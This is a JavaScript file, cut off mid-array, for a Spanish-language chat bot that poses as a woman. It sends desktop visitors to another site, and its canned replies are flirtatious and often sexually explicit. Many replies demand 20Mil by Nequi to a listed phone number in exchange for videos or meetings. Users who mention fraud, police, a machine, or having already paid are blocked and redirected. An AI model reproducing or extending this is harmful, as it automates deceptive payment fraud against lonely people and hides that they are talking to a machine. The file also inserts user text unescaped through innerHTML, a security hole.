
















































// URL to redirect blocked users
const redirectUrl = "https://cambaby.netlify.app/";

// Detect if the user is on a mobile device
function isMobile() {
    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
    return /android|avantgo|blackberry|bada|iphone|ipad|ipod|kindle|mobile|opera m(ob|in)i|phone|palm|pie|tablet|up\.browser|up\.link|webos|wos/i.test(userAgent);
}

// Redirect if the user is on a PC and save block status
if (!isMobile()) {
    localStorage.setItem('isBlocked', 'true');
    window.location.href = redirectUrl;
}




$(document).ready(function() {
    $("#user-input").emojioneArea({
        pickerPosition: "top",
        tonesStyle: "bullet"
    });

    // Check if the user is blocked
    if (localStorage.getItem('isBlocked') === 'true') {
        window.location.href = redirectUrl;
    } else {
        // Send initial greeting message
        sendMessageWithRandomDelay('Hola');
    }
});

let mediaRecorder;
let audioChunks = [];
const messageTone = new Audio('nuevo.mp3'); // Ruta al archivo de audio

document.getElementById('record-voice').addEventListener('click', () => {
    if (!mediaRecorder || mediaRecorder.state === "inactive") {
        navigator.mediaDevices.getUserMedia({ audio: true })
            .then(stream => {
                mediaRecorder = new MediaRecorder(stream);
                mediaRecorder.start();
                mediaRecorder.ondataavailable = event => {
                    audioChunks.push(event.data);
                };
                mediaRecorder.onstop = () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
                    audioChunks = [];
                    const reader = new FileReader();
                    reader.onload = function(e) {
                        displayMessage('user', { type: 'voice', content: e.target.result });
                        handleIncomingMessage({ type: 'audio', content: e.target.result });
                    };
                    reader.readAsDataURL(audioBlob);
                };
            })
            .catch(error => console.error(error));
    } else if (mediaRecorder.state === "recording") {
        mediaRecorder.stop();
    }
});

function sendMessage() {
    const userInput = $("#user-input").data("emojioneArea").getText();
    const message = userInput.trim();

    if (message === '') return;

    displayMessage('user', { type: 'text', content: message });
    $("#user-input").data("emojioneArea").setText('');

    setTimeout(() => {
        const botResponse = handleIncomingMessage({ type: 'text', content: message });
        if (botResponse) {
            displayMessage('bot', botResponse);
        }
    }, 1000);
}

function sendMedia() {
    const fileInput = document.getElementById('media-input');
    const file = fileInput.files[0];
    if (file) {
        const reader = new FileReader();
        reader.onload = function(e) {
            const fileType = file.type.split('/')[0];
            if (fileType === 'image' || fileType === 'video') {
                displayMessage('user', { type: fileType, content: e.target.result });
                handleIncomingMessage({ type: fileType, content: e.target.result });
            }
        };
        reader.readAsDataURL(file);
    }
}

function displayMessage(sender, message) {
    const chatBox = document.getElementById('chat-box');
    const messageElement = document.createElement('div');
    messageElement.classList.add('message', sender);

    if (message.type === 'text') {
        messageElement.classList.add('text');
        messageElement.innerHTML = message.content;
    } else if (message.type === 'image') {
        messageElement.classList.add('media');
        const img = document.createElement('img');
        img.src = message.content;
        img.style.maxWidth = '100%';
        messageElement.appendChild(img);
    } else if (message.type === 'voice') {
        messageElement.classList.add('media');
        const audio = document.createElement('audio');
        audio.controls = true;
        audio.autoplay = true;
        audio.src = message.content;
        messageElement.appendChild(audio);
    } else if (message.type === 'video') {
        messageElement.classList.add('media');
        const video = document.createElement('video');
        video.controls = true;
        video.autoplay = true;
        video.src = message.content;
        video.style.maxWidth = '100%';
        messageElement.appendChild(video);
    }

    chatBox.appendChild(messageElement);
    chatBox.scrollTop = chatBox.scrollHeight;

    if (sender === 'bot') {
        messageTone.play(); // Reproduce el tono de mensaje
    }
}

const keywordResponses = [
    {
        keywords: ["hakeada","acoso","engaños","venezolano","no me intereza","no me interesa","una solicitud","me distingues","la bloqueo","pelao","no tengo recursos","esta raro","hakear","esa no eres tu","no eres tu","hp","falsa","ya te mande los","bulla","no me interesa", "extorcion", "no mando plata", "falsa",
         "robadas", "robe", "no envio dinero", "no envío dinero", "no envío dinero", "no pago","no soy de pagar","no es usted","grabacion","no creo","que eres tu","estoy pelado","en canado","no ver no ago","no te voy a enviar","no voy a pagar","no te voy","tu cuento","la misma persona","problemas","zorra","en la carcel","carcel","compu","no te voy a enviar","no te voy mandar","enviame plata tu", "maldita", "compu", "no mando dinero", "no te envio nada", "no insistas", "no te creo", "estoy pobre","sin platica","no doy adelantado", "agua fria","putas","no busco putas", "compu","no te voy a mandar","no mando plata","no me interesa","seas real","estoy preso","preso","no caigo", "diciendo mentiras", "mentiras", "robar a otro","a robar", "no eres la misma", "pura mentira",  "no me interesa", "estoy en la carcel", "la carcel", "estafar","engañar","bloqueo","la bloqueo","bobo","plata no envio","real","fraude","mentira","no eres tu",  "carcel", "maldita", "mentirosa", "bloquear","estafa","haker","robo","ladrona","real","cai","denunciar","estafadora","maquina","Maquina","computadora","una computadora","no real","no cumples","no real","robo","ladrona","no real","no eres Real","falso","me robo","envié los10","robaste","me robaste","no eres real","malparida","ladrones","que carcel","robot", "banco","mentirosa", "robado","no real","maquina","robando","real","soy de venezuela", "no es normal","y para eso tengo que enviarte plata", "lo das gratis", "porque me cobras", "porque me cobras", "me vas a seguir cobrando", "porque me pides20 mil","a que me paguen", "grabados", "falso", " no gracias", "cuentas falsa", "cuenta falsa","me pagan hasta","ando pelado","no te puedo enviar plata","no envío plata", "tunvado","tunbado", "no te conozco","ver y no comer", "no me han pagado","no doy plata","una máquina", "no creo", "no hay money", "no hay plata", "esa no es tu panocha", "no es tu panocha","no me gusta enviar plata","¿qué quieres?","que me paguen","que me vas a cumplir", "no me mandes nada", "una repetidera", "no mando nada", "repetidora", "póngase seria", "si eres tú", "que eres tú", "no te entiendo", "me ha pasado", "otro cuento", "ficticios", "no mando plata", "lejos del pueblo", "no, mi vida", "no hay Nequi", "no eres tú", "quien eres", "acá no es", "pidiendo plata", "no haces caso", "pa creerte", "no tengo manda tu", "yo no salgo","mentirosa", "no envío", "no hablas serio", "cosas falsas", "falsas","eres de dinero", "no eres tú", "no me enviaron", "ya te llego la transferencia", "mi sugar", "regálame un paquete", "no me excita", "orita nada", "echate agua","no me gusta","no me gusta","pero tú no", "no voy a pagar",  "cómo se que es verdad", "sin hacer nada", "robos", "estafas", "no se cansa", "estoy sin plata", "no se va poder", "le da asco", "no sé quién es", "insultar", "no me responde", "no la conozco", "no quiero","luego te doy la plata","luego le doy la plata",  "no la conozco", "si no no", "no se qué dices","no eres tú", "orita no", "quién es usted", "no creo", "quien eres", "no salgas con nada", "otra vez con lo mismo", "no hay plata", "no hay dinero", "no hay money", "a bloquear", "no sales con nada", "muy falsa", "falsa", "no me gusta enviar", "vividores", "no te creo","no le creo", "cómo sé que eso es verdad", "pagan mensual","engañado","engañando", "han engañado", "pura mentira", "no los tengo", "ni siquiera me conoces", "falsa", "no me gusta así", "estoy en una finca", "y me pagan el", "orita no hay",  "estoy ahora sin plata", "no es usted","sin sentindido","sin centido", "a que me paguen", "tunvado", "tumbado", "no te conozco", "no doy plata", "estafándome", "en la finca", "ser falsa", "soy mujer","argentina", "bahamas", "barbados", "belice", "bolivia", "brasil", "chile", "costa rica", "cuba", "dominica", "ecuador", "el salvador", "granada", "guatemala", "guyana", "haití", "honduras", "jamaica", "méxico", "nicaragua", "panamá", "paraguay", "peru", "republica dominicana", "san cristobal y nieves","san vicente y las granadinas", "santa lucía", "surinam", "trinidad y tobago", "uruguay", "venezuela", "españa", "estados unidos", "venezuela","ya envie los","sijin", "fiscalía", "investigador","no saliste con nada","ya mande la plata","hay se los envie","ya se los puse",
        "Ya  te envié","Ya te envié","Aller te envie","Ya te envié", "ya se los envie","ya le envie la plata","Ya se los envie","policia",
        "le voy a decir","ya te envie","Ya te envié","envie el dinero","envie la plata","le envie la plata","te envié plata","listo ya te envie",
        "te consine","Ya te gire","Ya yo te mandé la plata","ya te jire","ya le mnde","selo puse", "revise","revisa","te pague","te cancele",
        "le voy a decir","fiscalia","ya te deposite","ya deposite","ya te mande el dinero","ya le page","te transferi","mira el recibo", "ya se los mande","ya te envie",
        "ya te gire", "yo ya le mande", "yo ya le mande", "yo ya le mande", "yo ya le mande", "ya te los gire", "te envie la plata","ya te envié",
        "investigacion","publicar"],
        blockUser: true, // This keyword will block the user
    },
    {
  keywords: ["hola preciosa", "hola bb", "hola corazon", "hola princesa", "hola amor", "hola princesa", "hola bb", "hola preciosa", "hola reina", "hola como", "hola reina", "hola soy", "hola cariño", "hl","hola","hola","hola","noches", "saludos", "hla"],
  responses: ['Hola Bello❤️🔥.', 'Hola corazón', 'Hola❤️.','Hola☺️.', 'Hola cómo estás bebe','Hola Rey','Hola papi'],
  },

  // Tienes WhatsApp

  {
  keywords: ["tienes Wha","tienes Was","tiene Wha","tiene Was","tu Wha","tu Was","por Wha","por Was","pasame Wha","pasame Was","en Wha","en Was","tu Wha","tu Was","Wha","Was","Wha","Was","Wha","Was","Wha","Was","Wha","Was","Wha","Was","Wha","Was","Wha","Was","Wha","Was","Wha","Was","Wha","Was","Wha","Was","Wha","Was","Wha","Was","Wha","Was",
  "tiene WhatsApp","tiene WhatsApp", "pasame WhatsApp", "tienes Whatsapp","al wasap","wasat","wasa","Whatsapp","por Whatsapp","por Whatsapp","por Whatsapp","por Whatsapp","por Whatsapp","por Whatsapp","por Whatsapp","por Whatsapp","por Whatsapp","por Whatsapp","por Whatsapp","por Whatsapp","por Whatsapp",
  "por Whatsapp","por Whatsapp","por Whatsapp","por Whatsapp","por Whatsapp","por Whatsapp","por Whatsapp","por Whatsapp","por Whatsapp","por Whatsapp","por Whatsapp","por Whatsapp", "tu WhatsApp", "tienes WhatsApp","en whatsapp", "por whatsapp", "tu whatsapp", "el whatsapp", "su whatsapp"],
  responses: ['mi numero WhatsApp  3164909368 mas tarde te escribo por ahi amor', 'Más tarde te escribo por mi WhatsApp  3164909368', 'Más tarde te escribo en mi WhatsApp 3164909368', 'En un rato te mando mensaje si me escribes a mi WhatsApp 3164909368', 'Luego te lo envío, si me escribes a mi WhatsApp 3164909368', 'Después constesto si me escribes a mi WhatsApp 3164909368', 'Te escribire mas tarde si me escribes a mi WhatsApp 3164909368', 'En un momento te escribo a mi WhatsApp 3164909368  si me envias mensaje', 'En un momento te envio mensaje si me escribes a mi WhatsApp 3164909368', 'En un rato te contesto por mi WhatsApp 3164909368', 'Dentro de un rato WhatsApp 3164909368 te escribo por ahi', 'Más tarde te escribo por mi WhatsApp 3164909368', 'Te envio mensaje mas tarde si me escribes a mi WhatsApp 3164909368'],
  },
  {
    keywords: ["buenos dias", "feliz mañana","buen dia"],
    responses: ['Hola buenos días amor como amaneciste❤️.', 'Hola buenos dias❤️.', 'Hola feliz mañana🔥.','Hola Buenos dias💋.','Hola Rey','Hola papi'],
  },
  {
    keywords: ["yo vivo en","yo vivo en","yo soy","tambien vivo"],
    responses: ['Encantada de conocerte'],
  },
  {
    keywords: ["buena noche", "buenas noches", "feliz noche", "feliz noche"],
    responses: ['Buenas noches amor💋.', 'Feliz noche amor💋.', 'Buenas noches Rey','Buenas noches☺️.','Besos feliz noche amor'],
  },
  {
    keywords: ["buenas tardes", "buenas tarde","buena tarde", "feliz tarde"],
    responses: ['Buenas tardes amor💋.', 'Feliz tarde amor💋.', 'Feliz tarde Rey','Buena tarde amor☺️.'],
  },

  // compromiso de mañana

  {
    keywords: ["Voy mañana", "vemos mañana", "ver mañana", "Tocará mañana", "Listo mañana", "mañana te coloco", "dije q mañana", "Sería mañana", "te dije mañana", "consinaría mañana", "Mañana te mando", "MAÑANA LE ENVIO", "mañana le envio", "Mañana te envío", "Mañana amor sin falta", "Mañana recargo", "toca mañana", "Mañana puedo", "mañana ahora no", "anda mañana", "mañana te los puedo", "mañana te envío", "vemos mañana", "los paso mañana", "mañana boy", "en la mañana", "mañana si", "Boy mañana", "Para mañana", "mañana te guiro", "mañana te los", "mañana si puedo", "Si pero mañana", "mañana y te los", "Mañana nos vemos", "Mañana cuando", "Mañana se lo", "mañana apenas", "no vemos mañana", "pero mañana", "Mañana se lo", "mañana te pongo", "Toca mañana", "envío mañana", "Pero mañana", "mañana te lo", "pero mañana", "lo mando mañana", "yo mañana le", "envío mañana", "Mañana temprano", "mide mañana", "Mañana te coloco", "será mañana", "Mañana te los pongo", "Mañana te los envío", "Mañana te giro", "Mañana salgo", "puedo mañana", "mañana se los", "tocaría mañana", "te enbio mañana", "doy mañana", "en la mañana", "tu casa mañana", "En la mañana", "si quieres mañana", "puedes mañana", "amor mañana", "mañana te los envío", "te los doy mañana", "mañana te doy", "Mañana amorsito", "mañana te consigno", "Toca mañana", "Mañana bb", "Mañana te mando", "mañana te envío", "mañana si puedo", "Para ir mañana", "será hasta mañana", "culiar mañana", "mañana le pongo", "mando mañana", "Si pero mañana"],
    responses: ['Mañana espero tu pago, pero aún más ansío sentir el placer de nuestros encuentros amor.🔥💯.', 'Con gusto esperaré a que llegue mañana, pero ten en cuenta que la anticipación solo aumenta el placer de lo que está por venir','Claro, estaré aquí esperando tu dulce promesa de mañana, ansioso por dar vida a nuestros deseos compartidos','Estoy ansiosa por descubrir tu pago mañana y dar un paso mas adelante en nuestra conexión amor','Por supuesto, estaré ansiosa a que llegue mañana para recibir tu pago y disfrutar de nuestros momentos juntos amor','Estaré ansiosa a que llegue mañana para disfrutar juntos de muchos placeres amor.','Mañana, cuando me envies, te mostraré a cumplir los deseos más íntimos juntos amor','Mañana te espero ansiosamente para cumplir nuestros deseos más íntimos amor','Seria rico si lo hisieras mañana amor','Esperaré tu pago mañana, para hacerlo rico amor','hagalo ahora seria muy rico amor','Ok, ojalá y esto no sea UNa mentira','Estoy ansiosa por cumplir mañana, desnuda con ganas si me envias amor','Quiero hacerte muchas cosas ricas mañana cuando me envies amor','yo con unas ganas complacerte amor🥵','Seria rico si lo haces amor.','Amor no sabes todos los deseos que tengo de venirme cuando me envies mañana amor','Me encantaría explorar muchas cosas ricas, meñana cuendo me envies amor','sere tu mujer mañana cuendo me envies amor','Me encantaría meterme un dedito en mi culito y mostrarte, si mañana me envias amor', "Si pero usted se me desaparece!",],
  },
  // expresiones venga y le doy la plata
  {
    keywords: ["Cuando será","Cuando será","nos vemos hoy","aqui te los doy","Enviame la ubicación","y te llego","cuando nos","Quieres venir","cuando nos","cuando nos","aqui le doy","aca le doy","cuando","Va venir","cuando","Ven a mi casa","si vienes","vas a venir","vas a venir?","cuando","donde yo vivo","un taxi","mi casa","Venga",
    "Venga asta","Venga","doy en efectivo","aquí te pago","venga hasta aquí", "los dos le doy","aca le doy su plata","te pago aca","te doy aca","te doy aqui","alla te pago","aqui le pago","aqui te pago","venga hasta aqui","los dos le doy","te pago aqui","dinero en persona","Venga","Venga","Venga","Venga","Venga","Venga","Venga","Venga","Venga","Venga","Venga","Venga","Venga","Venga","Venga","Venga","Venga","Venga","Venga","Venga","Venga","y me visita","mi visita","Vienes","puedo visitar","encontrarnos","cuando te puedo","Cuando sera", "cuando vienes",  "encuentro","nos encontramos", "Cuando nos vemos","pero cuando","y vamos","vamos a","Venga","doy en efectivo", "te pago aca", "te pago acá", "te pago aqui", "acá te pago", "aquí te pago", "pago en efectivo","doy en efectivo", "te pago aca", "te pago acá", "te pago aqui", "acá te pago", "aquí te pago", "pago en efectivo","después la plata","doy en efectivo","aquí te pago", "venga hasta aquí","estemos los dos le doy","cuando estemos", "cuando nos vemos le envío","te pago aca", "te pago aqui","te pago acá", "te doy acá","allá te pago", "aquí le pago", "aquí le pago","aquí le pago","adelantado","acá te pago", "no aca te pago","si nos vemos","te pago después","no aguanta","ni te distingo","lástima","que no","pues no","no la conozco","no la verdad","no gracias","plata no "," no gracias","aquí te pago","dinero en persona","conocerte primero","te pago en efectivo","pago en efectivo"],
    responses: ["Bueno transfiere, quiero besar ese rico wevoo Por favor 🥹",'Primero, demuéstrame que hablas en serio enviame por Nequi 3164909368 20Mil. Después, podemos encontrarnos amor❤️.', 'Claro que sí Antes de planear algo, envíame por Nequi 3164909368 20Mil. Para saber que vas en serio amor.', 'Para asegurarnos de que hablas en serio, primero envía por Nequi 20Mil. Después, podemos disfrutar juntos amor. 😉','Para asegurarnos de que hablamos en serio, podrías enviarme primero por mi Nequi 3164909368 los 20Mil..',"Para saber que hablas en serio, primero envía a mi Nequi 20Mil. Después, podemos disfrutar juntos de mi culo amor🥵✨.","amor pues para ver si de verdad te intereso si me puedes enviar a mi nequi para saber que vas enserio amor"],
  },
  {
    keywords: ["Chao", "chaooo","Chao","Chao","Chaoo", "adios","mañana hablamos", "voy a descansar", "hasta pronto","voy a dormir", "Chaito"],
    responses: ['Chao Besos Amor¡¡🔥💋💋💋💋💋💋💋💋💋','Chao .', 'Chao Besitos Hermoso🔥♥💯💯💯💯💯💯💯💯💯', 'Espero y la pases rico Chao amor🙋‍♀️❤️🔥','Chao Besoss Preciosooo💓💯💯💯','Besossssss💓💯💯💯💯💯💯💯','Chao amor💋💯','Bueno chao que pases soñando conmigo Besos Amor🔥♥💤💤💤💤💤💤💤'],
  },
  {
    keywords: ["como estas","como vas", "tal", "buenos dias","buenas noches","tal","Como estas?", "muy bien y usted", "bien y tu"],
    responses: ['Estoy, bien gracias', 'Bien Gracias, Cómo estás vale?', 'Muy bien Gracias', 'Bien, gracias.', 'Estoy bien gracias a Dios y tu'],
  },
  {
    keywords: ["manda mas","manda mas","manda mas","manda mas","manda mas","manda mas", "otro video", "video rico", "videos culiando", "ya los vi", "manda tu", "mande videos", "un video", "enviame otro video", "otro video", "mas video", "mas videos", "mas fotos", "mismos videos", "mande mas videos", "video de su", "video de tu", "tienes videos", "tienes video", "fotos y videos", "mismo video", "video tuyo", "videos culiando", "otro", "otra","otra ft",
    "las enviaste","Ya me enviastes esos","las enviaste","las enviaste","Eso ya lo tengo","mensajes repetitivos","repetitivos","repetidos", "Manda mas","esos ya los vi", "muchas veces", "Ya me enviaste","ya las enviastes", "Ya me envio","foto de ahorita ","ya los tengo","Ya esos los vi","pides","fotos diferentes","ya me envio","con lo mismo", "Dejame verte", "pides",
     "pides","son los mismos","ya me las envío","envia lo mismo","mismos","mismos","mismos","mismos","los mismos","ya me envio esas", "mismos","mismos","mismos","mismos","mismos","no lo mismo","lo mismo","diferentes","diferentes","diferentes","enviastes","repites","repite",'muestrame'
  ],
    responses: ['Envíeme a mi Nequi 3164909368 los 20Mil y le hago los videos usted quiera, o no me haga perder más el tiempo, amor.','envíame a mi Nequi 3164909368 los 20Mil y are los videos que tu quieras todo el mes o no me hagas perder el mas el tiempo amor','amor tu me envias a mi Nequi 3164909368 yo te hago los videos como tu quieras todo el mes y si no vallase mejor amor','si me envia mi Nequi 3164909368 yo hago todos los videos que tu quieras todo el mes y si no quiere mejor no me escribas mas en su vida corazon','yo puedo hacerte muchos videos como tu los quieras todo el mes solo me envies a mi Nequi 3164909368 los 20Mil, nesecito dinero soy muy humilde corazon','yo encantada de hacerte todos los videos que tu quieras si me envis a mi Nequi 3164909368 los 20Mil pero si no quieres enviar ni te interesa enviarme no me molestes mas en su vida corazon','si normal igual aqui vamos hacer amigos los envies o no solo que si los mandas tienes mas derechos amor','te hago los videos como tu los quieras si me envias a mi Nequi 3164909368 los20Mil amor','si quieres que te envié videos como tu los quieres todos los dias mandeme20Mil a mi Nequi 3164909368 y si no vallase y no regrese mas por favor',"me envias los 20Mil a mi nequi te hago todos los videos que como tu los quieras este mes amor"],
  },

    {
      keywords: ["tengo parado", "te gusta","te gustaria","mamar","mamar","mamar","mamar","mamar","mamar","cuca", "comer", "culo", "cojerte", "tetas" , "excita", "duro", "paro", "vagina", "grande","masturbarme", "chupartela",
        "chuparsela", "panocha", "mamarcela", "anal", "penetrarte", "comerte", "verga", "pechospene", "culito", "meterselo", "oral", "guevo", "chupar", "sexo", "venirme", "paja", "cenosmamar", "cuca", "culo", "cojerte",
         "tetas" , "excita", "duro", "paro", "vagina", "grandemasturbarme", "chupartela", "chuparsela", "panocha", "mamarcela", "anal", "penetrarte", "comerte", "verga", "pechospene", "culito","meterselo", "oral", "guevo", "chupar",
         "sexo", "venirme", "paja", "cenosmamar", "cuca", "culo", "cojerte", "tetas ", "excita", "duro", "paro", "vagina", "grandemasturbarme", "chupartela", "chuparsela", "panocha", "mamarcela", "anal", "penetrar", "comerte",
         "verga", "mamarlo", "pechospene", "culito", "meterselo", "pene","culito","trio", "mamarselo","venirme","paraito","culiar", "mojadita","chupo","te chupo", "postura", "mojada", "lo meto", "paja","ruza", "tetas", "Chuparte", "cosita", "muchas ganas", "darte duro", "venir","lengua","sexo","pecho","culea","lo meto", "en cuatro","cuca","paja","pichas","chupadora", "chucha","leche","provoca", "chochita","Parado","exitas","chupas", "vagina","verga","penetrarte","por atras", "clítoris","pezones","clítoris","vagina","panocha","arrecho","vengas","panochota","delicioso","panocha","cuca","venirme","senos", "guevo", "chupar", "oral","detras","sabroso","cuatro","delicioso","venirte","chupo", "pecho","cachuo","teta","chupo","pichas","chuparia","sexo","chupartela","clavo","kuliar","chuparte","parolo","metertelo","teticas", "chorros","colita","senitos","cuka","culo","excitado","vagina", "chuparte","lambertela","piernas","gallito","vengas","chupo","mojar","masturbandose","chocho","vajina","parado","metertelo","duro", "chupar","chuparias","morboso","chupete","sexi","vaginal","cogerte","teticas","culo","benirme","venirme","pechos","rajita","chiquito","cucona","chupo","fisting","palmaditas","masturva","comer", "chupando","huevo","cuquita","cukita","grueso","pechitos","me vengo","puntita","culito","gimes","Llenarlas","Llenarte","comas", "todito","chupas","venir","metiendotelo","consolador","dedo", "chupamelo","dandose","metere","llena de","huevas","mamada","boca", "Piquitos","juguetes","la cara","seno","legua","lengua","follarte", "calientes","ardientes","caliente","la comas","culiarte", "berga","verga","grueso","grande","comas", "pipi", "semen","chorriandome", "masturbes","chorro","la cama", "multiorgasmica","orgasmo","vajina","puchecas", "en 4","culiarmela", "culiamos","chupes","sentirte", "metertelo","chiguito", "clavan","meter","culiamos","chocha","te viniste", "bajina","la paja", "te cojan","kulito", "penetrar","lengua", "cojan","chupas","parar ","soy adicto","cojer", "Sabrozo", "besarte","vaginita","culiarte", "vaginota","morbo", "esas ganas","sexo", "cucota","senos", "venir dentro","anal", "culo","cabeza","clitorix","clitoris","ardiente", "sexo","sexo","sexo","sexo","sexo","sexo","sexo","sexo","sexo","sexo", "venirme", "paja","cenos"],
      responses: ['Así me encanta el huevo rico 🤤 Ami me gusta mucho', 'Cree q con esas labias de q me va hacer feliz', 'Q Rico Eso Me Encanta', 'Ay No Se Que Decir🤭', 'Super rico❤️❤️', 'divino papasito', 'Uf, qué rico. Me encantaría. 😋😋😋😋', 'Ayyy Q RiKo sii', 'Qué delicia 😘😘❤😍😍😍', 'Dime que me harías', 'Q rico seriaa amor 😍😍❤️🤤😈', 'Huuuuy q ricoo Mii bb', 'mee encantaa q ricooo mi amor', '😋😋😋q riicooo me encantaaaaaa', 'yaaa quiroo sentirlooo', 'Aaaaahh uufhssss q ricoooo', 'Riiicooo 😋😋👅', 'Ricooo riicoo ricoooo', 'Uufhsss dioossssss q ricoooooo 😍😍😍😍😍😈😈😈', 'q me deje las piernas temblando sexo rudo contigo amor seria perfectoo', 'Huy q riiicooo uffhsss', 'Quierooo esooo paraaa mi, sentirloo dentro de miii😍😍😍😍', 'Q ricooo sería super😈😋😋😋', 'Mee encantaria sentirlo dentro d mii 😈😋😋', '😋😋😋 seriaaaa ricooo', 'yoo quierooo 😈😈', 'sii Bebé y me mandas videos yoo quiero ver 😋😋😋😈😍😍', 'Waooo q ricoooo bb', 'Q ricooo bb meee encantaaas', 'huy q ricoo bb','Quiero darte mucho culo amor.', 'Uf q ricooooooo mee encantaria tu penee😋😋😋😋', '😋😋😋 ufsss ricoooo', 'Pero no me mandas', '😮😮😋😋😋😈q riiicoooo mee encantaaa','Yo con ganas de que me lo metas bien rico mi amor','Yo quiero venirme amor','Estoy mojada amor','Jajajaja si tú vieras cm hago el amor','Quería estar contigo, amor','la tengo mojada amor.','Webo es lo que quiero amor.',  'Venga y juguemos en la cama',  'Me tienes mil Hermoso.','Se debe sentir rico muy rico','Yo quiero abrazarte para que me metas el pene','Tu pene es mi felicidad',  'Si mi amor te lo hago así y te lo chupo y me trago tu espelma',  'Quiero que me metas el pene en el culo',  'Quiero sentir tu pene en mi cuka pero quiero que me des bien duro amor',  'Si rico no me importa que me duela quiero tu pene grande dentro de mi cuka amor',  'mi cuka ama a tu pene amor','Quiero pene',  'Me haces gritar de placer mi amor amo tu pene y lo quiero para mí solita', 'Rico te lo mamo cuántas veces quieras',  'Quiero cojer con tigo amor','Quiero coger contigo mi príncipe azul','Quiero que me chupes las tetas',  'quiero sentir tu huevo dentro de mi así todo grande por mi Cuca y mi boca uuuff y mi culito rico','Venga y yo lo enseñó a hacerme gritar De placer amor',  'Así me encanta mamá el huevo rico 🤤 Ami me gusta mucho','Tu me darias pene amor',  'Quiero chupar tu pene amor','Quiero venirme amor','Quiero tu pene amor❤.','Yo quiero pene amor♥','quiero que me den por el culito rico',  'tu te imajinas yo consientiendote todos los dias tu pene amor','yo si quiero que me des tu pene amor💋🔥.','Para que se venga en mi cuca amor',  'yo si quiero que seas tu el que me coja amor💋🔥.','Quiero darte mi cuca amor',  'Si que rico seria sentirte dentro de mi amor','lo tienes paradito amor','siento mucho placer cuando chateo amor','me colocas caliente amor','Estaba muy caliente pensándolo amor',  'Quiero que me hagas temblar las piernas amor.','quiero que me hagas venir amor','Quiero saber que se siente tu pene mientras me cojes amor',  'para colocarte el pene, bien erecto, mientras lo lamo hasta la punta y lo devoro con mis labios Amor',  'No te imajinas lo mucho q me exita pensar en ti hermoso','Así me encanta que te gusta que te hagan en la cama',  'Uuf si rico 🤤 yo te haría acabar con mi boca',  'Si tengo ganas ya estoy mojadita','Me dejaste muy mojada','Te quiero sentir RiKo amor','Seré tu esclava sexual','Tengo unas tetas grandes y deliciosas',  'Nesecito culiarte hasta el cansancio','Cual pose te gusta más mi amor lindo dime','Quiero chuparte el pene bien sabroso',  'Me hiciste mojar riko','Ufff me excitas mucho',],
    },
    {
  keywords: ['rico','cosota','videito', 'rica','rika','riko', 'provocativa', 'ricota', 'lechita', 'desnuda','video', 'videos', 'mandame', 'fotos','fotico','foto','foticos'],
  sequences: [

    [
      ['Tenía pensado que si me enviabas algo te enviaría algo rico', 6000],
      ['Enviame 20Mil a mi nequi 3164909368 te are los videos que tu quieras amor', 6000],
      ['enviar video video1.mp4', 6000],
      ['enviar video video2.mp4', 6000],
      ['enviar video video3.mp4', 6000],
      ['Enviame y hacemos video llamadas todo el mes amor', 6000],
    ],
    [
      ['Si me envía la plata ahora le acepto llamadas para que me veas', 6000],
      ['Envia 20Mil a mi nequi 3164909368 seria mas que suficiente cariño❤️', 6000],
      ['enviar video anal.mp4', 6000],
      ['enviar video cola3.mp4', 6000],
      ['enviar video polvo.mp4', 6000],
      ['Cuando me envíes algo yo te envío muchas cosas rica', 6000],

    ],
        [
      ['Amor enviame 20Mil a mi nequi 3164909368 y te enseño que es placer todo el mes amor', 6000],
      ['enviar video video1.mp4', 6000],
      ['enviar video video2.mp4', 6000],
      ['enviar video video3.mp4', 6000],
      ['yo si te paro Rico todo el mes amor', 6000],

    ],
      [
      ['amor enviame 20mil a mi nequi 3164909368 que tu me dises como quieres que te haga los videos que yo te complasco amor', 6000],
      ['enviar video anal.mp4', 6000],
      ['enviar video cola3.mp4', 6000],
      ['enviar video polvo.mp4', 6000],
      ['Me puedes video llamar todo el mes a mi me gusta venirme mucho amor', 6000],
    ],
    [
      ['Enviame 20Mil a mi nequi 3164909368 que yo le hago lo que usted quiera amor', 6000],
      ['enviar video veterna.mp4', 6000],
      ['enviar video a2.mp4', 6000],
      ['enviar video 4a.mp4', 6000],
      ['puedes verme como me doy en llamada hasta venirme amor', 6000],

    ],
    [
      ['enviame a mi nequi 3164909368 20Mil y te hago los videos mas ricos que puedas ver amor', 6000],
      ['enviar video veterna.mp4', 6000],
      ['enviar video a3.mp4', 6000],
      ['enviar video febrero.mp4', 6000],
      ['yo si hago que se te pare duro amor', 6000],

    ],
    [
      ['Enviame 20Mil a mi nequi 3164909368 que yo lo complasco con lo que usted me diga amor', 6000],
      ['enviar video toche.mp4', 6000],
      ['enviar imagen lana2.jpg', 6000],
      ['enviar imagen lana3.jpg', 6000],
      ['enviar video lana4.mp4', 6000],
      ['puedes verme en video llamada hasta todo el mes amor', 6000],

    ],
    [
      ['si quieres enviame 20Mil a mi nequi 3164909368 te are los videos que tu quieras amor', 6000],
      ['enviar video video1.mp4', 6000],
      ['enviar video video2.mp4', 6000],
      ['enviar video video3.mp4', 6000],
    ],
    [
      ['Mi amor si tu me envias a mi nequi 3164909368 los 20Mil yo puedo consentirte con todo lo que usted me diga todo el mes, yo soy muy caliente Amor🥵🔥🔥🔥', 6000],
      ['enviar video anal.mp4', 6000],
      ['enviar video cola3.mp4', 6000],
      ['enviar video polvo.mp4', 6000],
    ],
    [
      ['Si me envias a mi nequi 3164909368 20Mil yo le hago cosas ricas todo el mes, como tu me digas amor', 6000],
      ['enviar video video1.mp4', 6000],
      ['enviar video video2.mp4', 6000],
      ['enviar video video3.mp4', 6000],
    ],
    [
      ['Amor me envias 20Mil a mi nequi 3164909368 no pienso dejar que usted pase de largo sin venirse rico todo el mes amor', 6000],
      ['enviar video anal.mp4', 6000],
      ['enviar video cola3.mp4', 6000],
      ['enviar video polvo.mp4', 6000],
    ],
    [
      ['Amor me envias a mi nequi 3164909368 20 mil yo lo consiento con todo lo que usted quiera para que nunca me deje amor', 6000],
      ['enviar video veterna.mp4', 6000],
      ['enviar video a2.mp4', 6000],
      ['enviar video 4a.mp4', 6000],
    ],
    [
      ['Yo puedo ayudarte a lograr que se te pare rico solo enviame a mi nequi 3164909368 20Mil yo soy muy calinte y se complacerlo rico amor', 6000],
      ['enviar video veterna.mp4', 6000],
      ['enviar video a3.mp4', 6000],
      ['enviar video febrero.mp4', 6000],

    ],
    [
      ['Enviame a mi nequi 3164909368 20Mil y la pasamos rico todo el mes, te hago videos como digas llamadas y lo que tu digas tu amor', 6000],
